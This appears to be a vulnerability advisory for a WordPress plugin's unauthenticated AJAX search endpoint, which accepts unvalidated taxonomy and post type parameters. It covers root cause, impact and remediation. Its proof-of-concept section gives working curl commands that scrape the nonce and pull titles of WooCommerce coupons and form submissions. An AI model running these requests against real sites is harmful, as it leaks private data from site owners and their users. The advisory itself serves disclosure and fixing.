# REA-002: Unauthenticated Taxonomy Name Injection in AJAX Search

## Severity
MEDIUM (CVSS ~5.3)

## Vulnerability Type
Improper Input Validation / Information Disclosure

## Affected Component
- **File:** `classes/modules/wpr-ajax-search.php`
- **Class:** `WPR_Ajax_Search`
- **Method:** `data_fetch()` (line 26)
- **Handler:** `wp_ajax_nopriv_wpr_data_fetch`

## Authentication Required
None (unauthenticated). The nonce `wpr-addons-js` is exposed to all visitors.

## Root Cause

The `data_fetch()` method uses several user-supplied POST parameters directly as taxonomy names and post types in WP_Query arguments without validation against registered/public taxonomies:

### Taxonomy Name Injection (lines 49, 76, 83, 107)

```php
// Line 49 - $_POST['wpr_option_post_type'] used directly as taxonomy
$tax_query = array(
    array(
        'taxonomy' => $_POST['wpr_option_post_type'],  // UNSANITIZED
        'field'    => 'term_id',
        'terms'    => sanitize_text_field($_POST['wpr_category']),
    ),
);

// Line 83 - $_POST['wpr_taxonomy_type'] used directly
$taxonomy_type_string = $_POST['wpr_taxonomy_type'];  // UNSANITIZED

// Line 107 - Used in tax_query
'taxonomy' => $_POST['wpr_taxonomy_type'],  // UNSANITIZED
```

### Post Type Injection (lines 130, 142)

```php
'post_type' => $_POST['wpr_query_type'] === 'all' || (...) 
    ? $all_post_types 
    : array( sanitize_text_field($_POST['wpr_query_type']) ),
```

While `sanitize_text_field` prevents injection of special characters, it does not validate that the value is a legitimate public post type. An attacker can specify any post type slug.

## Attack Flow

1. Attacker sends a POST request to `admin-ajax.php` with `action=wpr_data_fetch`
2. Sets `wpr_query_type` to a non-public post type (e.g., `shop_coupon`, `flamingo_inbound`, `wpr_submissions`)
3. Sets `wpr_keyword` to a search term
4. The query runs against the specified post type and returns titles and permalinks

For taxonomy enumeration:
1. Set `wpr_option_post_type` to a private taxonomy name
2. If WP_Query produces results, the taxonomy exists and has terms

## Impact

- **Information Disclosure:** Titles and permalinks of posts in non-public post types (e.g., WooCommerce coupons, Flamingo submissions, custom form submissions)
- **Taxonomy Enumeration:** Confirm existence of private/internal taxonomies
- **Data Exfiltration:** Combined with keyword search, systematically extract content from non-public post types

## Proof of Concept

```bash
# Extract nonce
NONCE=$(curl -s https://target.com/ | grep -oP '"nonce":"([a-f0-9]+)"' | head -1 | grep -oP '[a-f0-9]+')

# Query non-public post type (e.g., WooCommerce coupons)
curl -X POST https://target.com/wp-admin/admin-ajax.php \
  -d "action=wpr_data_fetch" \
  -d "nonce=$NONCE" \
  -d "wpr_keyword=%" \
  -d "wpr_query_type=shop_coupon" \
  -d "wpr_category=false" \
  -d "wpr_number_of_results=100" \
  -d "wpr_search_results_offset=0" \
  -d "wpr_show_description=no" \
  -d "wpr_show_ajax_thumbnail=no" \
  -d "wpr_show_product_price=no" \
  -d "wpr_show_view_result_btn=no" \
  -d "wpr_exclude_without_thumb=no" \
  -d "wpr_show_attachments=no" \
  -d "wpr_ajax_search_link_target=_self" \
  -d "wpr_no_results=No results" \
  -d "wpr_show_ps_pt=no" \
  -d "wpr_meta_query=no"

# Query form submissions
curl -X POST https://target.com/wp-admin/admin-ajax.php \
  -d "action=wpr_data_fetch" \
  -d "nonce=$NONCE" \
  -d "wpr_keyword=%" \
  -d "wpr_query_type=wpr_submissions" \
  -d "wpr_category=false" \
  -d "wpr_number_of_results=100" \
  -d "wpr_search_results_offset=0" \
  -d "wpr_show_description=yes" \
  -d "wpr_number_of_words=50" \
  -d "wpr_show_ajax_thumbnail=no" \
  -d "wpr_show_product_price=no" \
  -d "wpr_show_view_result_btn=no" \
  -d "wpr_exclude_without_thumb=no" \
  -d "wpr_show_attachments=no" \
  -d "wpr_ajax_search_link_target=_self" \
  -d "wpr_no_results=No results" \
  -d "wpr_show_ps_pt=no" \
  -d "wpr_meta_query=no"
```

## Remediation

1. Validate `$_POST['wpr_option_post_type']` and `$_POST['wpr_taxonomy_type']` against `get_taxonomies(['public' => true])` 
2. Validate `$_POST['wpr_query_type']` against `get_post_types(['publicly_queryable' => true])`
3. Apply the same `is_allowed_grid_query_post_type()` pattern already used in `wpr-grid-helpers.php`

## Note

The `wpr_query_type` on lines 130/142 has a partial mitigation: the free version forces `$all_post_types` (from `get_custom_types_of('post', false)` which uses `show_in_nav_menus => true`). The premium version allows arbitrary post type specification. However, `show_in_nav_menus` is not equivalent to `publicly_queryable` and some private post types may have this flag set.
